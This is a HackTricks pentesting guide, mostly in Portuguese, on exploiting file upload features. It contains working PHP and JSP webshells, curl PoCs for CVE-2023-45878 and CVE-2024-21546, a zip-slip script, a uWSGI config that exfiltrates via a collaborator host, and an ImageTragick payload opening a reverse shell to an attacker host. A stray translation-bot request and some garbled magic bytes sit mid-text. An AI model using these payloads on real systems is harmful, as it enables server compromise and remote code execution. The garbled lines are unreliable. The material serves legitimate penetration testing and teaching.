# Envio de Arquivos

{{#include ../../banners/hacktricks-training.md}}

## Metodologia Geral de Envio de Arquivos

Outras extensões úteis:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Contornando checagens de extensões de arquivo

1. Se aplicável, verifique as **extensões** mencionadas anteriormente. Teste também usando **letras maiúsculas**: _pHp, .pHP5, .PhAr ..._
2. _Verifique **adicionando uma extensão válida antes** da extensão de execução (use as extensões anteriores também):_
- _file.png.php_
- _file.png.Php5_
3. Tente adicionar **caracteres especiais no final.** Você pode usar Burp para **bruteforcear** todos os caracteres **ascii** e **Unicode**. (_Note que você também pode tentar usar as **extensões** mencionadas **anteriormente**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Tente contornar as proteções **enganando o parser de extensão** do servidor com técnicas como **duplicar** a **extensão** ou **adicionar junk** data (bytes **null**) entre extensões. _Você também pode usar as **extensões anteriores** para preparar um payload melhor._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Adicione **outra camada de extensões** ao teste anterior:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Tente colocar a **extensão de execução antes** da extensão válida e torça para que o servidor esteja mal configurado. (útil para explorar misconfigurações do Apache onde qualquer coisa com extensão** _**.php**_**, mesmo não terminando em .php, pode executar código):
- _ex: file.php.png_
7. Usando **NTFS alternate data stream (ADS)** no **Windows**. Neste caso, um caractere dois-pontos ":" será inserido após uma extensão proibida e antes de uma permitida. Como resultado, um **arquivo vazio com a extensão proibida** será criado no servidor (ex.: "file.asax:.jpg”). Esse arquivo pode ser editado depois usando outras técnicas, como usar seu short filename. O padrão "**::$data**” também pode ser usado para criar arquivos não vazios. Portanto, adicionar um ponto após esse padrão pode ser útil para contornar restrições adicionais (ex.: "file.asp::$data.”)
8. Tente quebrar os limites de nome de arquivo. A extensão válida é cortada. E o PHP malicioso permanece. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Alguns upload handlers removem ou normalizam caracteres de ponto finais do nome do arquivo salvo. No UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) em versões anteriores à 2.9.1, você pode contornar a validação de extensão por:

- Usar um MIME de imagem válido e o magic header correspondente (ex.: o header do PNG `\x89PNG\r\n\x1a\n`).
- Nomear o arquivo enviado com uma extensão PHP seguida por um ponto, por exemplo, `shell.php.`.
- O servidor remove o ponto final e persiste `shell.php`, que será executado se for colocado em um diretório servido pela web (storage público padrão como `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Em seguida, acesse o caminho salvo (típico em Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigações:
- Atualizar unisharp/laravel-filemanager para ≥ 2.9.1.
- Aplicar allowlists estritas no servidor e revalidar o filename persistido.
- Servir uploads a partir de locais não executáveis.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page could also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Encontrar uma vulnerabilidade para **renomear** o arquivo já enviado (para mudar a extensão).
- Encontrar uma vulnerabilidade de **Local File Inclusion** para executar o backdoor.
- **Possível divulgação de informação**:
1. Fazer upload **várias vezes** (e ao **mesmo tempo**) do **mesmo arquivo** com o **mesmo nome**
2. Fazer upload de um arquivo com o **nome** de um **arquivo** ou **pasta** que **já existe**
3. Fazer upload de um arquivo com **"." , "..", or "…" como nome**. Por exemplo, em Apache no **Windows**, se a aplicação salva os arquivos enviados em "/www/uploads/" directory, o filename "." vai criar um arquivo chamado
uploads” in the "/www/" directory.
4. Fazer upload de um arquivo que pode não ser deletado facilmente como **"…:.jpg"** em **NTFS**. (Windows)
5. Fazer upload de um arquivo em **Windows** com **caracteres inválidos** como `|<>*?”` no nome. (Windows)
6. Fazer upload de um arquivo em **Windows** usando nomes **reservados** (**proibidos**) como CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Tente também **fazer upload de um executável** (.exe) ou um **.html** (menos suspeito) que **vai executar código** quando inadvertidamente aberto pela vítima.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
A execução do payload ocorre durante a análise do arquivo de configuração. Para que a configuração seja ativada e parseada, o processo uWSGI deve ser reiniciado (potencialmente após um crash ou devido a um Denial of Service attack) ou o arquivo deve estar configurado para auto-reload. O recurso de auto-reload, se habilitado, recarrega o arquivo em intervalos especificados ao detectar mudanças.

É crucial entender a natureza permissiva da análise do arquivo de configuração do uWSGI. Especificamente, o payload discutido pode ser inserido em um arquivo binário (por exemplo, uma imagem ou PDF), ampliando ainda mais o escopo de exploração potencial.

### Gibbon LMS escrita arbitrária de arquivo para pre-auth RCE (CVE-2023-45878)

Endpoint não autenticado no Gibbon LMS permite escrita arbitrária de arquivo dentro da raiz web, levando a pre-auth RCE ao dropar um arquivo PHP. Versões vulneráveis: até e incluindo 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (o servidor ignora type/name e decodifica em base64 a parte final)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC to write and read back a file:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Implante um webshell mínimo e execute comandos:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notas:
- O handler performs `base64_decode($_POST["img"])` after splitting by `;` and `,`, then writes bytes to `$absolutePath . '/' . $_POST['path']` without validating extension/type.
- O código resultante roda como o usuário do serviço web (por exemplo, XAMPP Apache no Windows).

Referências para este bug incluem o advisory da usd HeroLab e a entrada no NVD. Veja a seção Referências abaixo.

## **wget File Upload/SSRF Truque**

Em algumas ocasiões você pode encontrar que um servidor está usando **`wget`** para **baixar arquivos** e você pode **indicar** a **URL**. Nesses casos, o código pode estar verificando que a extensão dos arquivos baixados está dentro de uma whitelist para assegurar que somente arquivos permitidos serão baixados. No entanto, **essa verificação pode ser contornada.**\
O **comprimento máximo** de um **nome de arquivo** em **linux** é **255**, entretanto, **wget** trunca os nomes de arquivo para **236** caracteres. Você pode **baixar um arquivo chamado "A"*232+".php"+".gif"**, esse nome de arquivo vai **burlar** a **verificação** (como, neste exemplo, **".gif"** é uma **extensão válida**) mas `wget` irá **renomear** o arquivo para **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Observe que **outra opção** que você pode estar pensando para contornar essa verificação é fazer com que o **HTTP server redirecione para um arquivo diferente**, de modo que a URL inicial passe pela verificação, mas então o wget fará o download do arquivo redirecionado com o novo nome. Isso **não funcionará** **a menos que** o wget esteja sendo usado com o **parâmetro** `--trust-server-names` porque **o wget fará o download da página redirecionada com o nome do arquivo indicado na URL original**.

### Escapando do diretório de upload via NTFS junctions (Windows)

(Para este ataque você precisará de acesso local à máquina Windows) Quando os uploads são armazenados em subpastas por usuário no Windows (por exemplo, C:\Windows\Tasks\Uploads\<id>\) e você controla a criação/remoção dessa subpasta, você pode substituí-la por uma directory junction que aponte para um local sensível (por exemplo, o webroot). Uploads subsequentes serão gravados no caminho de destino, possibilitando execução de código se o destino interpretar server‑side code.

Exemplo de fluxo para redirecionar uploads para o webroot do XAMPP:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notas
- mklink /J cria uma junction de diretório NTFS (reparse point). A conta do servidor web deve seguir a junction e ter permissão de escrita no destino.
- Isso redireciona gravações arbitrárias de arquivos; se o destino executar scripts (PHP/ASP), isso se torna RCE.
- Defesas: não permita que diretórios raiz de upload graváveis sejam controláveis por um atacante em C:\Windows\Tasks ou similar; bloqueie a criação de junctions; valide extensões no lado do servidor; armazene uploads em um volume separado ou com ACLs que neguem execução.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Alguns upload/ingest handlers gravam o corpo bruto da requisição em um caminho do filesystem que é construído a partir de parâmetros de query controlados pelo usuário. Se o handler também suporta Content-Encoding: gzip e falha em canonicalizar/validar o caminho de destination, você pode combinar directory traversal com um payload gzipped para gravar bytes arbitrários em um diretório servido pela web e obter RCE (por exemplo, dropar um JSP em Tomcat’s webapps).

Fluxo genérico de exploração:
- Prepare seu payload server-side (por exemplo, um JSP webshell mínimo) e compacte os bytes com gzip.
- Envie um POST onde um parâmetro de caminho (por exemplo, token) contenha traversal escapando a pasta pretendida, e file indique o nome do arquivo a persistir. Defina Content-Type: application/octet-stream e Content-Encoding: gzip; o corpo é o payload comprimido.
- Acesse o arquivo gravado para acionar a execução.

Requisição ilustrativa:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Por favor cole aqui o conteúdo de src/pentesting-web/file-upload/README.md (ou confirme onde posso acessá-lo). Vou traduzir para português mantendo exatamente a mesma marcação e seguindo as regras que você indicou.
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notas
- Os caminhos alvo variam conforme a instalação (por exemplo, /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ em algumas stacks). Qualquer pasta exposta na web que execute JSP funcionará.
- A extensão Hackvertor do Burp Suite pode produzir um corpo gzip correto a partir do seu payload.
- Este é um padrão puro de pre-auth arbitrary file write → RCE; não depende de multipart parsing.

Mitigações
- Determine destinos de upload no lado servidor; nunca confie em fragmentos de caminho vindos de clientes.
- Canonicalize e imponha que o caminho resolvido permaneça dentro de um diretório base allow-listed.
- Armazene uploads em um volume não-executável e negue execução de scripts a partir de caminhos graváveis.

## Ferramentas

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) é uma ferramenta poderosa projetada para auxiliar Pentesters and Bug Hunters na testagem de mecanismos de upload de arquivos. Ela aproveita várias técnicas de bug bounty para simplificar o processo de identificação e exploração de vulnerabilidades, garantindo avaliações completas de aplicações web.

### Corrompendo índices de upload com peculiaridades do snprintf (histórico)

Alguns handlers de upload legados que usam `snprintf()` ou similares para construir arrays multi-arquivo a partir de um upload de arquivo único podem ser enganados para forjar a estrutura `_FILES`. Devido a inconsistências e truncamento no comportamento de `snprintf()`, um upload cuidadosamente construído pode aparecer como múltiplos arquivos indexados no lado servidor, confundindo a lógica que assume uma forma estrita (por exemplo, tratando-o como um upload multi-arquivo e tomando ramos inseguros). Embora seja nichado hoje em dia, esse padrão “index corruption” ocasionalmente ressurgem em CTFs e bases de código mais antigas.

## De upload de arquivo para outras vulnerabilidades

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Faça upload do \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Verifique se há algum **limite de tamanho** ao enviar arquivos

Aqui está uma lista top 10 de coisas que você pode alcançar enviando arquivos (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Bytes mágicos do cabeçalho

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Upload de Zip/Tar que é automaticamente descomprimido

Se você puder enviar um ZIP que será descomprimido no servidor, você pode fazer 2 coisas:

### Symlink

Faça upload de um link contendo soft links para outros arquivos; então, ao acessar os arquivos descomprimidos você acessará os arquivos linkados:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Descomprimir em pastas diferentes

A criação inesperada de arquivos em diretórios durante a descompressão é um problema significativo. Apesar das suposições iniciais de que essa configuração poderia proteger contra OS-level command execution através de uploads maliciosos, o suporte a compressão hierárquica e as capacidades de directory traversal do formato de arquivo ZIP podem ser explorados. Isso permite que atacantes contornem restrições e escapem de diretórios de upload seguros manipulando a funcionalidade de descompressão da aplicação alvo.

Um exploit automatizado para gerar tais arquivos está disponível em [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). O utilitário pode ser usado como mostrado:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Além disso, o **symlink trick with evilarc** é uma opção. Se o objetivo for atingir um arquivo como `/flag.txt`, um symlink para esse arquivo deve ser criado no seu sistema. Isso garante que evilarc não encontre erros durante sua operação.

Abaixo está um exemplo de código Python usado para criar um arquivo zip malicioso:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusando da compressão para file spraying**

Para mais detalhes **confira o post original em**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Código PHP é escrito para executar comandos passados pela variável `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Múltiplos arquivos são criados e um arquivo zip é montado contendo esses arquivos.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Os nomes dos arquivos dentro do zip são alterados usando vi ou um editor hexadecimal, trocando "xxA" por "../" para atravessar diretórios.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Envie este conteúdo com uma extensão de imagem para explorar a vulnerabilidade **(ImageMagick , 7.0.1-1)** (a partir do [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporando PHP Shell em PNG

Incorporar um PHP shell no chunk IDAT de um arquivo PNG pode contornar efetivamente certas operações de processamento de imagem. As funções `imagecopyresized` e `imagecopyresampled` do PHP-GD são particularmente relevantes neste contexto, pois são comumente usadas para redimensionar e reamostrar imagens, respectivamente. A capacidade do PHP shell embutido de permanecer inalterado por essas operações é uma vantagem significativa para certos casos de uso.

Uma exploração detalhada desta técnica, incluindo sua metodologia e aplicações potenciais, é fornecida no seguinte artigo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Este recurso oferece uma compreensão abrangente do processo e suas implicações.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Arquivos Polyglot

Arquivos polyglot funcionam como uma ferramenta única em segurança cibernética, atuando como camaleões que podem existir validamente em múltiplos formatos de arquivo simultaneamente. Um exemplo interessante é um [GIFAR](https://en.wikipedia.org/wiki/Gifar), um híbrido que funciona tanto como GIF quanto como um arquivo RAR. Esses arquivos não se limitam a essa combinação; combinações como GIF e JS ou PPT e JS também são factíveis.

A utilidade central dos arquivos polyglot está na capacidade de contornar medidas de segurança que filtram arquivos com base no tipo. A prática comum em várias aplicações envolve permitir apenas certos tipos de arquivo para upload — como JPEG, GIF ou DOC — para mitigar o risco apresentado por formatos potencialmente perigosos (por exemplo, JS, PHP ou Phar files). No entanto, um polyglot, ao conformar-se aos critérios estruturais de múltiplos tipos de arquivo, pode contornar essas restrições de forma furtiva.

Apesar da adaptabilidade, os polyglots enfrentam limitações. Por exemplo, enquanto um polyglot pode simultaneamente incorporar um arquivo PHAR (PHp ARchive) e um JPEG, o sucesso do upload pode depender das políticas de extensão de arquivo da plataforma. Se o sistema for rigoroso quanto às extensões permitidas, a mera dualidade estrutural de um polyglot pode não ser suficiente para garantir o upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Fazer upload de JSONs válidos como se fossem PDF

Como evitar a detecção de tipo de arquivo ao enviar um arquivo JSON válido mesmo que não seja permitido, falsificando um arquivo PDF (técnicas de **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Contanto que os bytes mágicos `%PDF` estejam nos primeiros 1024 bytes, ele é considerado válido (veja exemplo no post)
- **`pdflib` library**: Adicionar um formato PDF falso dentro de um campo do JSON para que a biblioteca pense que é um PDF (veja exemplo no post)
- **`file` binary**: Ele pode ler até 1048576 bytes de um arquivo. Basta criar um JSON maior do que isso para que ele não consiga interpretar o conteúdo como JSON e então, dentro do JSON, colocar a parte inicial de um PDF real e ele irá considerá-lo um PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
